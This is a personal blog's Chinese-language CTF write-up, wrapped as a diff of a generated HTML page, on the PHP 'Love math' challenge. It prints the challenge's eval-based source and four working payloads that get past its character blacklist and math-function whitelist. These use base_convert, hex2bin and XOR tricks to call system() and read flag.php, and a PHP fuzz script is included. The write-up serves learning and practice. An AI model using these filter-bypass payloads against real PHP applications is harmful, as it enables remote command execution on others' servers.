@@ -1,0 +1,362 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Love math | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="Love math1234567891011121314151617181920212223242526272829&amp;lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;    //例子 c=20-1    $content = $_GET[&amp;#x27;c&amp;#x27;];    if (strlen($content) &amp;gt;= 80) &amp;#123;        die(&amp;quot;太长了不会算&amp;quot;);    &amp;#125;    $blacklist = [&amp;#x27; &amp;#x27;, &amp;#x27;\t&amp;#x27;, &amp;#x27;\r&amp;#x27;, &amp;#x27;\n&amp;#x27;,&amp;#x27;\&amp;#x27;&amp;#x27;, &amp;#x27;&amp;quot;&amp;#x27;, &amp;#x27;`&amp;#x27;, &amp;#x27;\[&amp;#x27;, &amp;#x27;\]&amp;#x27;];    foreach ($blacklist as $blackitem) &amp;#123;        if (preg_match(&amp;#x27;/&amp;#x27; . $blackitem . &amp;#x27;/m&amp;#x27;, $content)) &amp;#123;            die(&amp;quot;请不要输入奇奇怪怪的字符&amp;quot;);        &amp;#125;    &amp;#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&amp;#x27;abs&amp;#x27;, &amp;#x27;acos&amp;#x27;, &amp;#x27;acosh&amp;#x27;, &amp;#x27;asin&amp;#x27;, &amp;#x27;asinh&amp;#x27;, &amp;#x27;atan2&amp;#x27;, &amp;#x27;atan&amp;#x27;, &amp;#x27;atanh&amp;#x27;, &amp;#x27;base_convert&amp;#x27;, &amp;#x27;bindec&amp;#x27;, &amp;#x27;ceil&amp;#x27;, &amp;#x27;cos&amp;#x27;, &amp;#x27;cosh&amp;#x27;, &amp;#x27;decbin&amp;#x27;, &amp;#x27;dechex&amp;#x27;, &amp;#x27;decoct&amp;#x27;, &amp;#x27;deg2rad&amp;#x27;, &amp;#x27;exp&amp;#x27;, &amp;#x27;expm1&amp;#x27;, &amp;#x27;floor&amp;#x27;, &amp;#x27;fmod&amp;#x27;, &amp;#x27;getrandmax&amp;#x27;, &amp;#x27;hexdec&amp;#x27;, &amp;#x27;hypot&amp;#x27;, &amp;#x27;is_finite&amp;#x27;, &amp;#x27;is_infinite&amp;#x27;, &amp;#x27;is_nan&amp;#x27;, &amp;#x27;lcg_value&amp;#x27;, &amp;#x27;log10&amp;#x27;, &amp;#x27;log1p&amp;#x27;, &amp;#x27;log&amp;#x27;, &amp;#x27;max&amp;#x27;, &amp;#x27;min&amp;#x27;, &amp;#x27;mt_getrandmax&amp;#x27;, &amp;#x27;mt_rand&amp;#x27;, &amp;#x27;mt_srand&amp;#x27;, &amp;#x27;octdec&amp;#x27;, &amp;#x27;pi&amp;#x27;, &amp;#x27;pow&amp;#x27;, &amp;#x27;rad2deg&amp;#x27;, &amp;#x27;rand&amp;#x27;, &amp;#x27;round&amp;#x27;, &amp;#x27;sin&amp;#x27;, &amp;#x27;sinh&amp;#x27;, &amp;#x27;sqrt&amp;#x27;, &amp;#x27;srand&amp;#x27;, &amp;#x27;tan&amp;#x27;, &amp;#x27;tanh&amp;#x27;];    preg_match_all(&amp;#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#x27;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &amp;#123;        if (!in_array($func, $whitelist)) &amp;#123;            die(&amp;quot;请不要输入奇奇怪怪的函数&amp;quot;);        &amp;#125;    &amp;#125;    //帮你算出答案    eval(&amp;#x27;echo &amp;#x27;.$content.&amp;#x27;;&amp;#x27;);&amp;#125;
+
+函数解释：
+1preg_match_all ( string $pattern , string $subject [, array &amp;amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] ) : int
+
+搜索subject中所有匹配pattern给定正则表达式 的匹配结果并且将它们以flag指定顺序输出到matches中.结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。
+这段代码的意思是：首先接收一个c, 长度还不能大于 80 。还不能有黑名单中的 空格、\t、\r、\n、引号、方括号。然后设置白名单，必须符合。也就是必须输入白名单中的函数。最后用eval()来执行并返回我们的参数。
+做题思路：
+首先 php 允许把函数名通过字符串方式传递给一个变量，然后通过变量动态调用函数。如$a=&amp;quot;abc&amp;quot;;$A()就会执行 abc() 函数。
+php 中函数名默认为字符串，可以进行异或。
+方法一"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Love math"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Love math</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Love-math"><a href="#Love-math" class="headerlink" title="Love math"></a>Love math</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] ) : int</span><br></pre></td></tr></table></figure>
+
+<p>搜索<code>subject</code>中所有匹配<code>pattern</code>给定正则表达式 的匹配结果并且将它们以<code>flag</code>指定顺序输出到<code>matches</code>中.结果排序为<code>$matches[0]</code>保存完整模式的所有匹配, <code>$matches[1]</code> 保存第一个子组的所有匹配，以此类推。</p>
+<p>这段代码的意思是：首先接收一个<code>c</code>, 长度还不能大于 80 。还不能有黑名单中的 空格、<code>\t</code>、<code>\r</code>、<code>\n</code>、引号、方括号。然后设置白名单，必须符合。也就是必须输入白名单中的函数。最后用<code>eval()</code>来执行并返回我们的参数。</p>
+<p><strong>做题思路：</strong></p>
+<p>首先 php 允许把函数名通过字符串方式传递给一个变量，然后通过变量动态调用函数。如<code>$a=&quot;abc&quot;;$A()</code>就会执行 abc() 函数。</p>
+<p>php 中函数名默认为字符串，可以进行异或。</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>想办法构造<code>$_GET[1]</code>再传参getflag，但是其实发现构造这个很难。。。因为<code>$</code>、<code>_</code>、<code>[</code>、<code>]</code>都不能用，同时<code>GET</code>必须是大写，很难直接构造。</p>
+<p>先看一下用到的一些数学函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert ( string $number , int $frombase , int $tobase ) : string </span><br></pre></td></tr></table></figure>
+
+<p>返回一字符串，包含 <code>number</code> 以 <code>tobase</code> 进制的表示。<code>number</code> 本身的进制由 <code>frombase</code> 指定。<code>frombase</code> 和 <code>tobase</code> 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。意思就是将输入数字的进制进行转换。</p>
+<p>可以使用这个函数将其他进制数转为36进制，而是36进制是包含所有数字和小写字母的。但终究无法构造<code>GET</code>大写字母。但又可以构造其他的小写字母函数，让构造的函数转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdec ( string $hex_string ) : number    //十六进制转换为十进制</span><br><span class="line">dechex ( int $number ) : string        //十进制转换为十六进制</span><br><span class="line">bin2hex ( string $str ) : string    //函数把包含数据的二进制字符串转换为十六进制值</span><br><span class="line">hex2bin ( string $data ) : string    //转换十六进制字符串为二进制字符串    </span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以想象一下，把<code>_GET</code>先利用<code>bin2hex()</code>转换为 十六进制，在利用<code>hexdec()</code>转换为十进制，那么反过来就可以把一段数字转换为字符。</p>
+<p>但是<code>binhex()</code>， <code>hexdec()</code>等不是白名单的函数，要从哪里来？</p>
+<p>这时候就要看<code>base_convert()</code>的作用了，因为上面的函数都是小写的，所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符。这里三十六进制是10个数字+26个小写字母，因此能够完整表示出一个函数名的所有字符。</p>
+<p>那么怎么才能直到这个数呢？我们可以先逆向将三十六进制字符转换为十进制数，得到该数字，最终逆向构造即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(&#x27;hex2bin&#x27;,36,10);        //37907361743</span><br><span class="line">base_convert(37907361743,10,36);    //hex2bin</span><br></pre></td></tr></table></figure>
+
+<p>再将<code>_GET</code>反向构造出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(&#x27;_GET&#x27;);    //得到 5f474554 将字符转换为十六进制</span><br><span class="line">hexdec(&#x27;5f474554&#x27;);    //得到 1598506324 将十六进制转为十进制</span><br><span class="line"> </span><br><span class="line">dechex(1598506324);        //得到 5f474554 将十进制转换为十六进制</span><br><span class="line">hex2bin(&#x27;5f474554&#x27;);    //得到 _GET</span><br></pre></td></tr></table></figure>
+
+<p>白名单中有<code>dechex()</code>、<code>hexdec()</code>函数，但是没有<code>hex2bin()</code>、<code>bin2hex()</code>函数，但是我们可以使用<code>base_convert()</code>函数构造任意小写函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))        //hex2bin(dechex(1598506324))</span><br></pre></td></tr></table></figure>
+
+<p>可以用<code>&#123;&#125;</code>代替<code>[]</code>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=ls</span><br><span class="line">// $pi=_GET;($_GET[abs])($_GET[acos])    ==&gt; $pi=_GET;(system)(ls)</span><br><span class="line">//得到 _GETflag.php index.php</span><br><span class="line"> </span><br><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat flag.php</span><br><span class="line">//得到flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>可以构造<code>getallheaders()</code>传参，此是小写的，可以直接用<code>base_convert</code>转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheaders ( void ) : array</span><br></pre></td></tr></table></figure>
+
+<p>获取全部 HTTP 请求头信息。</p>
+<p>首先构造<code>system</code>和<code>getallheaders</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(&#x27;getallheaders&#x27;,30,10);</span><br><span class="line">//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功</span><br><span class="line"> </span><br><span class="line">base_convert(&#x27;system&#x27;,36,10);    //得到1751504350</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert;$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line">HEADER:    1:cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>直接<code>cat f*</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo dechex(16)^asinh^pi;        //输出*</span><br><span class="line">base_convert(&#x27;cat&#x27;,36,10);        //得到15941</span><br><span class="line">base_convert(&#x27;system&#x27;,36,10);        //得到1751504350</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br><span class="line"> </span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line"></span><br><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br><span class="line">// system(ls)</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexdec(bin2hex(&#x27;cat f*&#x27;));        //得到109270211257898</span><br><span class="line">base_convert(&#x27;exec&#x27;,36,10);        //得到696468</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=($pi=base_convert)(696468,10,36)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"> </span><br><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这里发现一个问题，这个payload超过了80的长度限制，所以只能把三十四进制转换为二十三进制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><p>前面都是利用白名单的数学函数将数字转成字符串，其实也可以异或构造这是fuzz脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=[<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span>=<span class="variable">$payload</span>[<span class="variable">$k</span>] ^<span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span><span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>is_nan^64==&gt;_G</code>和<code>tan^15==&gt;ET</code></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat flag.php</span><br><span class="line"> </span><br><span class="line">//$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php  ==&gt;  system(cat flag.php)</span><br></pre></td></tr></table></figure>
+
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/06/20/Php/Hash 比较/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/12/31/Hello/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-03-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Writeup/">Writeup<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
